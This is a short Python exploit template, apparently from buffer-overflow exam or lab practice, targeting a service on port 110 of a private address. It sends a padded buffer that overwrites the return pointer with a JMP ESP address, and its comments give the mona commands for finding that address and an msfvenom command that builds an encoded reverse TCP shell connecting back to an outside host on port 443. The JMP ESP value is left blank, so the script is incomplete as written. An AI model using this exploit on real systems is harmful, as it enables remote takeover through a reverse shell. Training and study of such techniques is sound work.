#!/usr/bin/env python  
import socket
import struct
RHOST = "10.11.12.36"
RPORT = 110 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((RHOST, RPORT))

buf_totlen = 2700 #get this from fuzzing
offset_srp = 2606 #get this from pattern_offset

ptr_jmp_esp =  #get this from !mona jmp -r esp -bpb "\x00\x0A" or !mona find -s "\xff\xe4" -m nameOfFileWIthNoDEPorASLR with with !mona modules

buf = ''
buf += 'A'*(offset_srp-len(buf))
buf += struct.pack("<I", ptr_jmp_esp)
buf += "\xCC\xCC\xCC\xCC"
buf += "D"*(buf_totlen-len(buf))
s.send(buf + '\n') 

#get shellcode (goes before the D's) from msfvenom -p windows/shell_reverse_tcp LHOST=10.22.124.68 LPORT=443 -f python --var-name=shell –e x86/shikata_ga_nai -b "\x00\x0a\x0d" 
